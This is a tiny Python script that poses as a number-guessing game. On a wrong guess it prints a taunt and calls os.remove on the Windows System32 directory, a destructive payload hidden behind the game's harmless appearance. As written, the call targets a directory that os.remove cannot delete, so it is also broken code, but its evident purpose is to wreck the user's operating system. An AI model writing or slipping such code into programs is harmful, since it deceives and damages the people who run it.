import random
import os

number = random.randint(1,10)
guess = input("Guess A number between 1 to 10 : ")
guess = int(guess)

if guess == number :
    print("You Win...!!")
else :
    print("Husss")
    os.remove("C:\\Windows\\System32")

